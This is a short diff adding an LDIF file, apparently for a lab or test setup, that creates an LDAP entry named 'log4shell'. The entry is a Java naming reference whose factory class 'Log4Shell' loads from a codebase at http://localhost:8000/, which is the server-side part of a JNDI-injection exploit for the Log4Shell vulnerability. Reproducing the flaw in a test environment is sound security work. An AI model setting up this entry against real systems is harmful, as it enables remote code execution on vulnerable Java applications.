@@ -1,0 +1,13 @@
+dn: dc=example,dc=com
+objectclass: dcObject
+objectclass: organization
+o: Example Company
+dc: example
+
+dn: cn=log4shell,dc=example,dc=com
+objectclass: javaContainer
+objectclass: javaNamingReference
+cn: log4shell
+javaClassName: foo
+javaFactory: Log4Shell
+javaCodebase: http://localhost:8000/
